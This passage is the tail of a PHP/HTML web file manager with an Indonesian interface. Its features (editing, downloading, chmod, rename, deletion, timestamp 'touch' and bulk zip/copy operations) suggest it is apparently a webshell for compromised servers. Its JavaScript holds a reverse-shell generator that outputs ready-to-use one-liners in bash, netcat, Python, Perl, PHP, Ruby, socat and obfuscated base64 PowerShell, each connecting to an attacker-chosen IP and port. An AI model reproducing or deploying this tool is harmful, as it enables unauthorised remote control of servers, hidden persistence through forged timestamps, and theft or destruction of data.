        <a href="<?= h($parentDirQuery) ?>" class="btn-up">Naik</a>
    <?php else: ?>
        <a href="#" class="btn-up disabled">Naik</a>
    <?php endif; ?>

    <?php if ($scanError): ?>
        <div class="message error"><?= h($scanError) ?></div>
    <?php elseif (empty($items)): ?>
        <div class="empty">Kosong</div>
    <?php else: ?>
    
    <form method="post" id="bulkForm">
        <div class="bulk-bar">
            <label style="font-weight:600; cursor:pointer; display:flex; align-items:center; gap:4px; color: var(--burgundy);">
                <input type="checkbox" id="checkAll" onclick="toggleAll(this)"> Centang Semua
            </label>
            <span style="color:var(--gray-border)">|</span>
            <span style="font-weight:bold; color:var(--burgundy); margin-right:5px;">Aksi Massal:</span>
            <div class="dropdown">
                <button type="button" class="btn btn-primary" onclick="toggleDropdown(event)">Pilih Aksi &#9662;</button>
                <div class="dropdown-content" id="actionDropdown">
                    <button type="submit" name="action" value="bulk_zip" onclick="return confirm('Zip file/folder terpilih?');">1. Zip Terpilih</button>
                    <button type="submit" name="action" value="bulk_unzip" onclick="return confirm('Ekstrak file .zip terpilih?');">2. Unzip Terpilih</button>
                    <button type="button" onclick="doCopy()">3. Copy (Ingat)</button>
                    <button type="submit" name="action" value="bulk_paste" id="btnPaste" onclick="return doPaste(false);" style="display:none; color:var(--burgundy); font-weight:bold;">4. Paste (Ctrl+V)</button>
                    <button type="submit" name="action" value="bulk_paste" id="btnPasteCut" onclick="return doPaste(true);" style="display:none; color:var(--burgundy); font-weight:bold;">4. Paste (Pindah)</button>
                    <button type="submit" name="action" value="bulk_delete" style="color: #d32f2f;" onclick="return confirm('Yakin ingin menghapus file/folder yang dipilih?');">5. Hapus Terpilih</button>
                </div>
            </div>
            <input type="hidden" name="clipboard" id="clipboardInput" value="">
            <input type="hidden" name="is_cut" id="isCutInput" value="0">
        </div>

        <table>
            <thead>
                <tr>
                    <th class="col-check"></th>
                    <th><a href="<?= h(sortUrl('name', $currentDir, $sortBy, $sortOrder, $isAbsolute)) ?>">Nama<?= sortArrow('name', $sortBy, $sortOrder) ?></a></th>
                    <th class="col-size"><a href="<?= h(sortUrl('size', $currentDir, $sortBy, $sortOrder, $isAbsolute)) ?>">Ukuran<?= sortArrow('size', $sortBy, $sortOrder) ?></a></th>
                    <th class="col-perm"><a href="<?= h(sortUrl('perm', $currentDir, $sortBy, $sortOrder, $isAbsolute)) ?>">Perm<?= sortArrow('perm', $sortBy, $sortOrder) ?></a></th>
                    <th class="col-owner"><a href="<?= h(sortUrl('owner', $currentDir, $sortBy, $sortOrder, $isAbsolute)) ?>">Owner:Group<?= sortArrow('owner', $sortBy, $sortOrder) ?></a></th>
                    <th class="col-mtime"><a href="<?= h(sortUrl('mtime', $currentDir, $sortBy, $sortOrder, $isAbsolute)) ?>">Terakhir Diubah<?= sortArrow('mtime', $sortBy, $sortOrder) ?></a></th>
                    <th class="col-actions">Aksi</th>
                </tr>
            </thead>
            <tbody>
            <?php 
            foreach ($items as $item):
                try {
                    $itemPath = $realPath . DIRECTORY_SEPARATOR . $item;
                    $isDir    = @is_dir($itemPath);
                    
                    $isReadable = @is_readable($itemPath);
                    $isWritable = @is_writable($itemPath);
                    $isExecutable = @is_executable($itemPath); 
                    
                    $permColorClass = '';
                    if (!$isReadable || ($isDir && !$isExecutable)) {
                        $permColorClass = 'perm-red';
                    } elseif ($isWritable) {
                        $permColorClass = 'perm-green';
                    }

                    if ($isDir) {
                        $childRaw = @scandir($itemPath);
                        $childCount = $childRaw ? (count($childRaw) - 2) : 0;
                        if ($childCount < 0) $childCount = 0;
                        $sizeDisplay = $childCount . ' item';
                    } else {
                        $sz = @filesize($itemPath);
                        $sizeDisplay = ($sz === false) ? '?' : formatSize($sz);
                    }
                    $perms    = substr(sprintf('%o', @fileperms($itemPath)), -4);
                    $ownerGrp = getOwnerGroup($itemPath);
                    $mtime    = @filemtime($itemPath);
                    $mtimeStr = formatMtime($mtime);
                    $itemDir  = $currentDir ? $currentDir . '/' . $item : $item;
                    $itemUrl  = '?dir=' . encodePath($isAbsolute ? '/' . $itemDir : $itemDir);
                    $jsName   = h(json_encode($item));
                    $dlUrl    = '?' . ($dirQuery ? $dirQuery . '&' : '') . 'download=' . rawurlencode($item);
                    $fullPath = $itemPath;
            ?>
                <tr>
                    <td><input type="checkbox" name="items[]" value="<?= h($item) ?>" class="item-checkbox"></td>
                    <td class="name">
                        <?php if ($isDir): ?>
                            <a href="<?= h($itemUrl) ?>" class="dir-link"><?= h($item) ?></a>
                        <?php else: ?>
                            <a onclick="openEditModal('<?= h(addslashes($item)) ?>')" class="file-link"><?= h($item) ?></a>
                        <?php endif; ?>
                    </td>
                    <td class="size"><?= h($sizeDisplay) ?></td>
                    <td class="perm <?= $permColorClass ?>"><?= h($perms) ?></td>
                    <td class="owner"><?= h($ownerGrp) ?></td>
                    <td class="mtime"><?= h($mtimeStr) ?></td>
                    <td>
                        <div class="actions">
                            <?php if (!$isDir): ?>
                                <button type="button" onclick="openEditModal('<?= h(addslashes($item)) ?>')" class="btn btn-sm">Edit</button>
                                <a href="<?= h($dlUrl) ?>" class="btn btn-sm" style="border-color:#0d6efd;color:#0d6efd;">Download</a>
                            <?php else: ?>
                                <button type="button" onclick="checkFolderSize('<?= h(addslashes($item)) ?>')" class="btn btn-sm" style="border-color:#0d6efd;color:#0d6efd;">Size</button>
                            <?php endif; ?>

                            <button type="button" onclick="copyPath('<?= h(addslashes($fullPath)) ?>')" class="btn btn-sm" style="border-color:#20c997;color:#20c997;">Copy Path</button>

                            <button type="submit" name="action" value="chmod" class="btn btn-sm" 
                                    onclick="event.preventDefault(); var p = prompt('Chmod:', '<?= $perms ?>'); if (p === null) return false; if (!p.trim()) return false; 
                                    var f = document.createElement('form'); f.method='POST'; f.innerHTML = '<input type=\'hidden\' name=\'action\' value=\'chmod\'><input type=\'hidden\' name=\'name\' value=\'<?= h($item) ?>\'><input type=\'hidden\' name=\'mode\' value=\''+p+'\'>'; document.body.appendChild(f); f.submit();">Chmod</button>

                            <button type="button" onclick="doTouch('<?= h(addslashes($item)) ?>')" class="btn btn-sm">Touch</button>

                            <button type="submit" name="action" value="rename" class="btn btn-sm"
                                    onclick="event.preventDefault(); var n = prompt('Rename:', <?= $jsName ?>); if (n === null) return false; if (!n.trim()) return false;
                                    var f = document.createElement('form'); f.method='POST'; f.innerHTML = '<input type=\'hidden\' name=\'action\' value=\'rename\'><input type=\'hidden\' name=\'old_name\' value=\'<?= h($item) ?>\'><input type=\'hidden\' name=\'new_name\' value=\''+n+'\'>'; document.body.appendChild(f); f.submit();">Rename</button>

                            <button type="submit" name="action" value="delete" class="btn btn-sm btn-danger"
                                    onclick="event.preventDefault(); if(!confirm('Hapus file ini?')) return false;
                                    var f = document.createElement('form'); f.method='POST'; f.innerHTML = '<input type=\'hidden\' name=\'action\' value=\'delete\'><input type=\'hidden\' name=\'name\' value=\'<?= h($item) ?>\'>'; document.body.appendChild(f); f.submit();">Hapus</button>
                        </div>
                    </td>
                </tr>
            <?php 
                } catch (Exception $e) {
                    echo '<tr><td colspan="7" style="color:#c00;padding:10px">' . h($e->getMessage()) . '</td></tr>';
                }
            endforeach; 
            ?>
            </tbody>
        </table>
    </form>
    <?php endif; ?>
</div>

<div id="editModal" class="modal-overlay">
    <div class="modal-content">
        <div class="modal-header"><h3 id="modalTitle">Edit File</h3><span class="modal-close" onclick="closeModal()">&times;</span></div>
        <form method="post" id="editForm">
            <input type="hidden" name="action" value="save">
            <input type="hidden" name="file" id="editFileName">
            <div class="modal-body"><textarea name="content" id="editContent" spellcheck="false"></textarea></div>
            <div class="modal-footer">
                <button type="button" class="btn" onclick="closeModal()">Batal</button>
                <button type="submit" class="btn btn-primary">Simpan Perubahan</button>
            </div>
        </form>
    </div>
</div>

<script>
var itemPaths = {
    <?php 
    foreach ($items as $item) {
        $p = $realPath . DIRECTORY_SEPARATOR . $item;
        echo "'" . addslashes($item) . "': '" . addslashes($p) . "',\n";
    }
    ?>
};

function toggleAll(source) {
    var checkboxes = document.querySelectorAll('.item-checkbox');
    for (var i = 0; i < checkboxes.length; i++) checkboxes[i].checked = source.checked;
}

function doCopy() {
    var checkboxes = document.querySelectorAll('.item-checkbox:checked');
    if (checkboxes.length === 0) { alert('Pilih file/folder yang mau di-copy dulu!'); return; }
    var paths = [];
    for (var i = 0; i < checkboxes.length; i++) {
        var name = checkboxes[i].value;
        if (itemPaths[name]) paths.push(itemPaths[name]);
    }
    localStorage.setItem('fm_clipboard', JSON.stringify(paths));
    alert(paths.length + ' file/folder berhasil di-copy. Pindah ke folder tujuan, lalu klik Paste.');
}

function doPaste(isCutMode) {
    var clip = localStorage.getItem('fm_clipboard');
    if (!clip) { alert('Clipboard kosong. Silakan Copy file dulu.'); return false; }
    if (isCutMode) localStorage.removeItem('fm_clipboard');
    document.getElementById('clipboardInput').value = clip;
    document.getElementById('isCutInput').value = isCutMode ? '1' : '0';
    return confirm('Paste ' + JSON.parse(clip).length + ' item ke folder ini?');
}

document.addEventListener("DOMContentLoaded", function() {
    var clip = localStorage.getItem('fm_clipboard');
    if (clip && JSON.parse(clip).length > 0) {
        document.getElementById('btnPaste').style.display = 'block';
        document.getElementById('btnPasteCut').style.display = 'block';
    }
});

function toggleDropdown(event) {
    event.stopPropagation();
    var dropdown = document.getElementById('actionDropdown');
    dropdown.classList.toggle('show');
}

window.addEventListener('click', function(e) {
    var dropdown = document.getElementById('actionDropdown');
    var btn = document.querySelector('.dropdown .btn');
    if (dropdown && dropdown.classList.contains('show')) {
        if (!dropdown.contains(e.target) && e.target !== btn) {
            dropdown.classList.remove('show');
        }
    }
});

function getCurrentDir() {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get('dir') || '';
}

function openEditModal(fileName) {
    document.getElementById('modalTitle').innerText = 'Edit: ' + fileName;
    document.getElementById('editFileName').value = fileName;
    document.getElementById('editContent').value = 'Loading...';
    document.getElementById('editModal').style.display = 'flex';
    fetch('?ajax=get_file&dir=' + encodeURIComponent(getCurrentDir()) + '&file=' + encodeURIComponent(fileName))
        .then(r => r.json()).then(data => {
            document.getElementById('editContent').value = (data.content !== undefined) ? data.content : 'Gagal memuat file.';
        }).catch(() => { document.getElementById('editContent').value = 'Terjadi kesalahan saat memuat file.'; });
}
function closeModal() { document.getElementById('editModal').style.display = 'none'; }

function checkFolderSize(name) {
    var btn = event.target;
    var orig = btn.innerText;
    btn.innerText = '...'; btn.disabled = true;
    fetch('?ajax=folder_size&dir=' + encodeURIComponent(getCurrentDir()) + '&folder=' + encodeURIComponent(name))
        .then(r => r.json()).then(data => {
            if (data.error) { alert(data.error); btn.innerText = orig; btn.disabled = false; return; }
            alert('Folder "' + name + '"\nTotal: ' + data.size_h + ' (' + data.files + ' files)');
            btn.innerText = orig; btn.disabled = false;
        }).catch(() => { btn.innerText = orig; btn.disabled = false; alert('Gagal menghitung size.'); });
}

function copyPath(path) {
    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(path).then(() => {
            var note = document.createElement('div');
            note.textContent = '✓ Path copied: ' + path;
            note.style.cssText = 'position:fixed; bottom:20px; right:20px; background:#4caf50; color:#fff; padding:12px 20px; border-radius:8px; z-index:9999; box-shadow:0 4px 12px rgba(0,0,0,0.2); font-size:13px;';
            document.body.appendChild(note);
            setTimeout(() => note.remove(), 2500);
        }).catch(() => alert('Gagal copy. Path: ' + path));
    } else {
        var ta = document.createElement('textarea');
        ta.value = path; document.body.appendChild(ta); ta.select();
        try { document.execCommand('copy'); alert('Path copied: ' + path); } catch(e) { alert('Path: ' + path); }
        ta.remove();
    }
}

function openTool(id) { 
    document.getElementById('modal-' + id).style.display = 'flex'; 
    if (id === 'touch_all') {
        var now = new Date();
        var pad = function(n) { return String(n).padStart(2,'0'); };
        var val = now.getFullYear() + '-' + pad(now.getMonth()+1) + '-' + pad(now.getDate()) + 'T' + pad(now.getHours()) + ':' + pad(now.getMinutes()) + ':' + pad(now.getSeconds());
        var inp = document.querySelector('#modal-touch_all input[name="touch_time"]');
        if (inp && !inp.value) inp.value = val;
    }
    if (id === 'revshell') { generateRevShell(); }
}
function closeTool(id) { document.getElementById('modal-' + id).style.display = 'none'; }

function doTouch(name) {
    var now = new Date();
    var pad = function(n) { return String(n).padStart(2,'0'); };
    var defaultVal = now.getFullYear() + '-' + pad(now.getMonth()+1) + '-' + pad(now.getDate()) + ' '
                   + pad(now.getHours()) + ':' + pad(now.getMinutes()) + ':' + pad(now.getSeconds());
    var t = prompt('Waktu touch untuk "' + name + '"\n(format: YYYY-MM-DD HH:MM:SS):', defaultVal);
    if (t === null || !t.trim()) return;
    var f = document.createElement('form');
    f.method = 'POST';
    var fields = { action: 'touch', name: name, touch_time: t };
    for (var k in fields) {
        var inp = document.createElement('input');
        inp.type = 'hidden'; inp.name = k; inp.value = fields[k];
        f.appendChild(inp);
    }
    document.body.appendChild(f); f.submit();
}

function generateRevShell() {
    var ip = document.getElementById('rs_ip').value || '1.2.3.4';
    var port = document.getElementById('rs_port').value || '4444';
    var type = document.getElementById('rs_type').value;
    var out = '';
    switch(type) {
        case 'bash': out = 'bash -i >& /dev/tcp/' + ip + '/' + port + ' 0>&1'; break;
        case 'bash_alt': out = '0<&196;exec 196<>/dev/tcp/' + ip + '/' + port + '; sh <&196 >&196 2>&196'; break;
        case 'nc': out = 'nc -e /bin/sh ' + ip + ' ' + port; break;
        case 'nc_mkfifo': out = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ' + ip + ' ' + port + ' >/tmp/f'; break;
        case 'python': out = "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"" + ip + "\"," + port + "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"; break;
        case 'perl': out = "perl -e 'use Socket;$i=\"" + ip + "\";$p=" + port + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"; break;
        case 'php': out = "php -r '$sock=fsockopen(\"" + ip + "\"," + port + ");exec(\"/bin/sh -i <&3 >&3 2>&3\");'"; break;
        case 'ruby': out = "ruby -rsocket -e'f=TCPSocket.open(\"" + ip + "\"," + port + ").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"; break;
        case 'powershell': out = "$client = New-Object System.Net.Sockets.TCPClient('" + ip + "'," + port + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"; break;
        case 'powershell_b64':
            var psCmd = "$client = New-Object System.Net.Sockets.TCPClient('" + ip + "'," + port + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()";
            out = 'powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand ' + btoa(unescape(encodeURIComponent(utf16le_b64(psCmd))));
            break;
        case 'socat': out = 'socat tcp-connect:' + ip + ':' + port + ' exec:/bin/sh,pty,stderr'; break;
    }
    document.getElementById('rs_output').value = out;
}

function utf16le_b64(str) {
    var buf = new ArrayBuffer(str.length * 2);
    var view = new Uint16Array(buf);
    for (var i = 0; i < str.length; i++) view[i] = str.charCodeAt(i);
    var bytes = new Uint8Array(buf);
    var bin = '';
    for (var i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]);
    return btoa(bin);
}

function copyRevShell() {
    var ta = document.getElementById('rs_output');
    ta.select(); ta.setSelectionRange(0, 99999);
    try { document.execCommand('copy'); alert('Command copied to clipboard!'); }
    catch(e) { alert('Gagal copy. Silakan copy manual.'); }
}

window.onclick = function(event) {
    if (event.target.classList.contains('modal-overlay')) {
        event.target.style.display = 'none';
    }
}
</script>
</body>
</html>
